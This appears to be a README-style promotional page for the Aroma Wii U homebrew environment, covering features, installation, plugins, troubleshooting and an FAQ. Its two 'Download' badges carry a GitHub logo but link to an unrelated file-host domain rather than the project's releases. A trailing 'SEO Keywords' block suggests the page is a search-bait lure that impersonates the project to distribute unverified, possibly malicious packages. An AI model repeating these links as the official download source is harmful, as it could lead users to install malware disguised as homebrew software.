
# Aroma — Nintendo Wii U Custom Firmware Environment

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Nintendo%20Wii%20U-blue?style=for-the-badge" alt="Nintendo Wii U"/>
  <img src="https://img.shields.io/badge/Type-Homebrew%20Environment-green?style=for-the-badge" alt="Homebrew Environment"/>
  <img src="https://img.shields.io/badge/Version-Beta--27-orange?style=for-the-badge" alt="Aroma Beta 27"/>
  <img src="https://img.shields.io/badge/License-Open%20Source-lightgrey?style=for-the-badge" alt="Open Source"/>
</p>

<p align="center">
  A modular homebrew environment for Nintendo Wii U, featuring plugins, system modules, WUHB applications, and flexible boot management.
</p>

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Aroma%20Wii%20U-blue?style=for-the-badge&logo=github" alt="Download Aroma Wii U"/></a>
</p>

## Overview

Aroma is a modular homebrew environment for the Nintendo Wii U. It provides a modern platform for running homebrew applications, system modules, and plugins while extending the functionality of the console.

Aroma is designed to load through the EnvironmentLoader and can be configured to start automatically using the PayloadLoader. Its modular architecture allows users to add or remove supported functionality without replacing the entire environment.

Aroma is the successor to Tiramisu and introduces an integrated plugin system, a new homebrew application format, background modules, and additional system-level features.

Aroma is intended specifically for the Wii U operating environment. It is not a custom firmware for the original Nintendo Wii and does not replace the vWii homebrew environment.

## Key Features

- **Homebrew Support:** Run compatible Wii U homebrew applications.
- **WUHB Format:** Support Wii U Homebrew Bundles containing application executables and associated resources.
- **Plugin System:** Extend console functionality through compatible plugins.
- **Background Modules:** Load modules that provide persistent system-level functionality.
- **Homebrew on Wii U Menu:** Launch supported homebrew applications directly from the system menu with the appropriate plugin.
- **EnvironmentLoader Integration:** Select and launch available environments.
- **PayloadLoader Support:** Enable a persistent entrypoint and optional automatic boot configuration.
- **Region Free:** Use compatible plugins to launch supported titles from other regions.
- **FTP Server:** Add background FTP access through FTPiiU Plugin.
- **Network Homebrew Loading:** Use WiiLoad-compatible functionality with supported plugins.
- **Controller Region Compatibility:** Use the DRC Region Free plugin for supported GamePad configurations.
- **Plugin Configuration Menu:** Configure installed plugins using the integrated menu.
- **Safe Mode:** Disable third-party plugins during startup using the supported button combination.
- **Modular Architecture:** Install only the modules and plugins required for a particular setup.

## Technical Specifications

| Component | Details |
|---|---|
| Environment | Aroma |
| Latest referenced release | Beta-27 |
| Release date | May 5, 2026 |
| Platform | Nintendo Wii U |
| System firmware | 5.5.5 / 5.5.6 |
| Environment loader | EnvironmentLoader |
| Boot integration | PayloadLoader |
| Base system | Mocha |
| Homebrew format | WUHB |
| Additional application formats | Compatible RPX applications |
| Plugin framework | Wii U Plugin System |
| Module framework | WUMS |
| Plugin framework API | WUPS |
| Storage | SD card |
| Configuration | Environment and plugin configuration files |
| Development status | Public Beta |

## Compatibility

Aroma is designed for the Nintendo Wii U and supports the documented Wii U system firmware versions.

| Console | Compatibility |
|---|---|
| Nintendo Wii U Basic | Supported |
| Nintendo Wii U Deluxe | Supported |
| Nintendo Wii U Premium | Supported |
| Wii U with firmware 5.5.5 | Supported |
| Wii U with firmware 5.5.6 | Supported |
| Original Nintendo Wii | Not supported |
| Wii U vWii mode | Separate homebrew environment required |

### Compatibility Notes

- Aroma runs in the Wii U operating environment, not in vWii mode.
- Use a compatible EnvironmentLoader and PayloadLoader setup.
- Existing browser exploit entrypoints can be used where supported.
- The system firmware and installed environment components should be checked before updating.
- Some older homebrew applications are not compatible with Aroma.
- Applications distributed in the WUHB format are designed for the Aroma homebrew workflow.

## Firmware Features

Aroma provides a modular custom firmware environment built around system modules, plugins, and homebrew integration.

### EnvironmentLoader

EnvironmentLoader provides the interface for selecting and launching installed environments.

Its functionality includes:

- Loading Aroma.
- Selecting other installed environments.
- Supporting environment switching.
- Working with compatible PayloadLoader configurations.
- Providing access to the configured boot environment.

### PayloadLoader

PayloadLoader provides a persistent entrypoint for launching EnvironmentLoader.

Depending on the installation configuration, it can support automatic startup into the selected environment.

### Plugin System

Aroma integrates the Wii U Plugin System, allowing compatible plugins to extend the operating system while running in the background.

Plugin functionality can include:

- Region-free patches.
- FTP server services.
- Homebrew launching from the Wii U Menu.
- Network-based application loading.
- Game modifications.
- Additional system and development utilities.

### Modules

Modules run in the background and provide functionality to the environment.

Aroma uses a modular architecture that allows additional components to be installed or removed independently.

### WUHB Homebrew Format

WUHB is a Wii U Homebrew Bundle format.

A WUHB package can include:

- Main application executable.
- Application icon.
- Banner image.
- Additional application resources.

With the appropriate homebrew menu plugin, supported WUHB applications can appear directly in the Wii U Menu.

### Region-Free Features

Compatible plugins can provide region-free functionality, including:

- Launching supported titles from other regions.
- Applying region-related patches.
- Supporting compatible GamePad region configurations.

## System Requirements

### Console Requirements

- Nintendo Wii U console.
- Compatible system firmware.
- Working SD card.
- Supported EnvironmentLoader installation.
- Compatible PayloadLoader setup for persistent boot.
- Sufficient free storage for environment files and applications.

### Storage Requirements

Recommended SD card preparation:

- Use a reliable SD or SDHC card.
- Format the card using a filesystem supported by the installation guide.
- Keep the SD card writable during normal Aroma operation.
- Preserve existing boot and environment files.
- Maintain enough free space for homebrew applications, plugins, and backups.

A write-protected SD card can cause errors, including error code 150-3030.

### Computer Requirements

A computer is useful for:

- Extracting Aroma packages.
- Preparing the SD card.
- Managing WUHB applications.
- Installing additional plugins and modules.
- Backing up environment files.
- Updating the EnvironmentLoader.

## Download & Installation

<p align="center">
  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Latest%20Aroma%20Package-blue?style=for-the-badge&logo=github" alt="Download Latest Aroma Package"/></a>
</p>

### Preparation

1. Confirm that the console is a Nintendo Wii U.
2. Check the installed system firmware.
3. Prepare a compatible SD card.
4. Ensure the SD card is not write-protected.
5. Back up important files before changing the homebrew environment.
6. Review the official Wii U Hacks Guide installation instructions.

### Installation Overview

1. Obtain the current Aroma package and required EnvironmentLoader files.
2. Extract the package contents.
3. Copy the required files to the root of the SD card.
4. Preserve the directory structure included in the package.
5. Insert the SD card into the Wii U.
6. Launch EnvironmentLoader using the supported entrypoint.
7. Select Aroma from the environment selection menu.
8. Verify that the Wii U Menu loads correctly.

You may need to hold `X` while launching EnvironmentLoader to open the environment selection menu.

### Automatic Boot Configuration

Aroma can be configured to start automatically through PayloadLoader.

Before enabling automatic boot:

- Verify that Aroma starts correctly through EnvironmentLoader.
- Confirm that the selected environment is correct.
- Keep a backup of the original boot configuration.
- Follow the official PayloadLoader installation and configuration guide.

### Additional Plugins and Modules

Aroma can be extended with optional components, including:

- Bloopair.
- FTPiiU Plugin.
- SDCafiine Plugin.
- Screenshot Plugin.
- Region Free Plugin.
- DRC Region Free Plugin.
- Wiiload Plugin.

Install only components that are compatible with the current Aroma release.

## Configuration & Management

### Environment Selection

EnvironmentLoader can be used to select available environments.

To open its selection menu, hold `X` while the EnvironmentLoader starts, when supported by the installed configuration.

### Plugin Configuration

Aroma includes a configuration interface for compatible plugins.

Depending on the installed configuration, it can be used to:

- Enable or disable plugins.
- Change plugin settings.
- Configure button combinations.
- Review available plugin options.
- Manage supported background functionality.

### Homebrew Applications

Aroma supports the WUHB homebrew distribution format.

Applications are commonly stored under:

`SD:/wiiu/apps/`

Compatible applications can be organized into separate folders.

With the `homebrew_on_menu_plugin`, supported WUHB applications can be displayed directly in the Wii U Menu.

### FTP Configuration

The FTPiiU Plugin can provide FTP server functionality in the background.

This can be used to transfer compatible files over a local network without repeatedly removing the SD card.

### Game Modifications

The SDCafiine Plugin supports game file redirection for compatible titles.

This allows supported game files to be replaced or modified without directly changing the original files stored in the game's installation.

### Safe Mode

Aroma includes a safe mode for disabling third-party plugins during startup.

The documented button combination is:

`L + D-Pad Up + Minus`

Use this mode when troubleshooting a plugin-related startup issue.

### Updating Aroma

1. Check the latest Aroma release.
2. Review the release notes.
3. Download the current Base Aroma package.
4. Update the EnvironmentLoader when required.
5. Back up existing configuration and plugin files.
6. Copy the updated files to the SD card.
7. Preserve compatible additional plugins and modules.
8. Start Aroma and verify normal operation.

## Troubleshooting

| Problem | Recommended action |
|---|---|
| Aroma does not start | Check EnvironmentLoader files and the SD card directory structure. |
| EnvironmentLoader does not appear | Verify the configured entrypoint and PayloadLoader installation. |
| Error 150-3030 | Check whether the SD card is write-protected. |
| Homebrew application is missing | Confirm that the application uses a supported format and is stored in the correct directory. |
| WUHB application does not launch | Check application compatibility and required dependencies. |
| Older ELF homebrew does not work | Use a compatible environment such as Tiramisu for unsupported legacy applications. |
| Plugin causes a crash | Start Aroma in safe mode and disable the problematic plugin. |
| FTP server is unavailable | Verify FTPiiU Plugin installation and network connectivity. |
| Region-free patch does not work | Check the plugin version and game compatibility. |
| Environment selection menu does not open | Hold `X` during EnvironmentLoader startup. |
| Console freezes when loading a title | Check for incompatible plugins or modules and review release notes. |

### Recovery Recommendations

- Keep a backup of the SD card.
- Use the latest compatible EnvironmentLoader.
- Remove recently installed third-party plugins when diagnosing crashes.
- Verify that modules and plugins match the installed Aroma release.
- Avoid mixing files from different environment packages.
- Use Tiramisu when an older homebrew application is not compatible with Aroma.

## FAQ

### 1. What is Aroma?

Aroma is a modular homebrew environment for Nintendo Wii U. It provides support for homebrew applications, plugins, background modules, and system customization.

### 2. Is Aroma a custom firmware?

Aroma is commonly described as a custom firmware environment. More precisely, it is a modular homebrew environment that uses system components, modules, and plugins to extend Wii U functionality.

### 3. Does Aroma work on the original Nintendo Wii?

No. Aroma is designed for Nintendo Wii U. The original Wii requires different homebrew software.

### 4. Does Aroma support Wii U firmware 5.5.5 and 5.5.6?

Yes. These firmware versions are listed in the project's compatibility information.

### 5. What is the difference between Aroma and Tiramisu?

Aroma is the newer environment with an integrated plugin system and WUHB application support. Tiramisu remains useful for running certain older homebrew applications that are incompatible with Aroma.

### 6. What is WUHB?

WUHB is a Wii U Homebrew Bundle format that can package an application executable together with its icon, banner, and additional resources.

### 7. Can I launch homebrew directly from the Wii U Menu?

Yes. The `homebrew_on_menu_plugin` allows compatible WUHB applications to be launched directly from the Wii U Menu.

### 8. Does Aroma support plugins?

Yes. Aroma includes the Wii U Plugin System and supports compatible plugins that add features such as FTP access, region-free functionality, and game modifications.

### 9. Can Aroma start automatically when the console is powered on?

Yes. With a compatible PayloadLoader installation and boot configuration, Aroma can be configured for automatic startup.

### 10. Can I use Aroma and Tiramisu on the same console?

Both environments can be available through EnvironmentLoader, allowing users to select the environment they need.

### 11. Why do some older homebrew applications fail?

Aroma has compatibility limitations. In particular, older ELF applications and some RPX applications may not work correctly. Tiramisu can be used for certain legacy applications.

### 12. What is the latest referenced Aroma version?

The latest referenced release is Aroma Beta-27, published on May 5, 2026. Check the official release page for subsequent updates.

## SEO Keywords

Nintendo Wii U, Aroma Wii U, Aroma CFW, Aroma Custom Firmware, Wii U Homebrew, Wii U Homebrew Environment, Wii U Plugins, Wii U Modules, EnvironmentLoader, PayloadLoader, Wii U Hacks, Wii U Modding, Wii U WUHB, WUHB Applications, Wii U Plugin System, WUPS, WUMS, Wii U Region Free, Bloopair, FTPiiU Plugin, SDCafiine, Wii U Game Mods, Wii U Homebrew Menu, Tiramisu Wii U, Wii U Autoboot, Wii U Homebrew Apps, Wii U Customization, Wii U System Modules
